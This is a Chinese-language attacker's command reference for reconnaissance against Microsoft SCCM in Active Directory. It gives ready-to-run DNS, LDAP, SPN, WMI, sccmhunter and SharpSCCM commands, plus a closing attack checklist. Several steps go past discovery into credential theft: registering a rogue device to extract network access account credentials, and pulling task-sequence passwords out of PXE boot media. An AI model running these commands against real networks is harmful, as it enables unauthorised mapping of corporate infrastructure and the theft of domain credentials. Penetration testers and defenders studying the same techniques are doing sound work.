# SCCM 侦察方法与工具命令参考

## DNS SRV 记录查询

SCCM 在 DNS 中注册 SRV 记录用于客户端自动发现 Management Point。

```bash
# 查找 Management Point
nslookup -type=SRV _mssms_mp._tcp.$DOMAIN
dig SRV _mssms_mp._tcp.$DOMAIN

# 查找 Software Update Point (SUP)
nslookup -type=SRV _mssms_sul._tcp.$DOMAIN
dig SRV _mssms_sul._tcp.$DOMAIN
```

**原理**: SCCM 客户端使用 `_mssms_mp._tcp` SRV 记录定位 Management Point。如果管理员启用了 DNS 发布 (默认行为)，攻击者可通过 DNS 枚举直接定位 SCCM 基础设施。

---

## LDAP 属性枚举

SCCM Management Point 在 Active Directory 中创建 `mSSMSManagementPoint` 对象类。

```powershell
# PowerShell — 查找 Management Point
([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | ForEach-Object {
    $_.Properties
}

# 查找 SCCM 相关 SPN
setspn -Q *SMS* | findstr /i "SMS"
setspn -Q *SCCM* | findstr /i "SCCM"
```

```bash
# ldapsearch
ldapsearch -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" \
  "(objectClass=mSSMSManagementPoint)" \
  mSSMSMPName mSSMSDefaultMP mSSMSSiteCode dNSHostName
```

### 关键 LDAP 属性

| 属性 | 说明 |
|------|------|
| `mSSMSMPName` | Management Point FQDN |
| `mSSMSSiteCode` | 站点代码 (如 PS1) |
| `mSSMSDefaultMP` | 是否为默认 MP |
| `mSSMSDeviceManagementPoint` | 设备管理点标识 |
| `dNSHostName` | 服务器 DNS 名称 |

---

## sccmhunter 模块详解

sccmhunter 是 SCCM 攻击的核心工具，包含多个模块。

### find 模块 — 发现 SCCM 基础设施

```bash
# 自动发现所有 SCCM 组件
sccmhunter.py find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
```

输出包含: 站点服务器、Management Point、Distribution Point、SMS Provider、Site Database 等。

### smb 模块 — 角色确认

```bash
# 通过 SMB 签名/服务确认角色
sccmhunter.py smb -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
```

### show 模块 — 结果展示

```bash
# 显示 SMB 枚举结果
sccmhunter.py show -smb

# 显示所有发现结果
sccmhunter.py show -all

# 显示用户/计算机信息
sccmhunter.py show -users
sccmhunter.py show -computers
```

### http 模块 — 策略提取

```bash
# 自动注册设备并提取 NAA
sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto

# 指定 MP
sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP \
  -mp "http://$MP_IP" -auto
```

---

## SharpSCCM 本地侦察

在已安装 SCCM 客户端的 Windows 主机上执行。

```powershell
# 本地站点信息
SharpSCCM.exe local site-info

# 枚举 SCCM 管理员
SharpSCCM.exe get class-instances SMS_Admin

# 查看站点保留信息
SharpSCCM.exe get class-instances SMS_SCI_Reserved

# 列出所有集合
SharpSCCM.exe get class-instances SMS_Collection

# 列出所有设备
SharpSCCM.exe get class-instances SMS_R_System -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"
```

---

## SCCM 角色识别表

通过端口、服务、文件特征识别 SCCM 角色。

| 特征 | 角色 |
|------|------|
| TCP 80/443 + IIS `CCM_*` 虚拟目录 | Management Point |
| TCP 80/443 + `SMS_DP$` 共享 | Distribution Point |
| TCP 80/443 + `SCCMContentLib$` 共享 | Distribution Point |
| TCP 1433 + `CM_<SITECODE>` 数据库 | Site Database |
| `SMS_SITE_COMPONENT_MANAGER` 服务 | Primary Site Server |
| `AdminService` REST API (TCP 443) | SMS Provider |
| `smsexec.exe` / `ccmexec.exe` 进程 | SCCM 客户端 |
| `WDS` (Windows Deployment Services) | PXE Service Point |

---

## PXE 启动介质发现

PXE 环境可在无域凭证的情况下发现 SCCM。

```bash
# pxethiefy — 探测 PXE 环境
pxethiefy.py explore -i $INTERFACE

# 如果发现 PXE 启动介质，提取密码
pxethiefy.py decrypt -i $INTERFACE
```

**原理**: SCCM PXE 启动介质可能包含明文或弱加密的任务序列密码。通过 DHCP 广播发现 PXE 服务后，下载启动镜像并提取其中的凭证。

---

## WMI 查询

在已安装 SCCM 客户端的主机上，通过 WMI 查询本地策略。

```powershell
# 检查 SCCM 客户端安装
Get-WmiObject -Class SMS_Authority -Namespace root\CCM

# 查看站点代码
Get-WmiObject -Namespace root\CCM -Class SMS_Client | Select-Object AssignedSite

# 查看 Management Point
Get-WmiObject -Namespace root\CCM -Class SMS_LookupMP

# 查看网络访问账号 (加密)
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
  -Class CCM_NetworkAccessAccount

# 查看集合变量
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
  -Class CCM_CollectionVariable
```

---

## 枚举检查清单

```
[ ] DNS SRV 查询 (_mssms_mp, _mssms_sul)
[ ] LDAP 查询 (mSSMSManagementPoint)
[ ] SPN 枚举 (SMS*, SCCM*)
[ ] sccmhunter find + smb + show
[ ] 本地 WMI (root\CCM) — 如已在客户端
[ ] PXE 探测 (pxethiefy)
[ ] SharpSCCM local site-info — 如已在客户端
[ ] 确认角色: MP, DP, Site Server, Site DB, SMS Provider
[ ] 确认站点代码
[ ] 确认 HTTP vs HTTPS MP
```
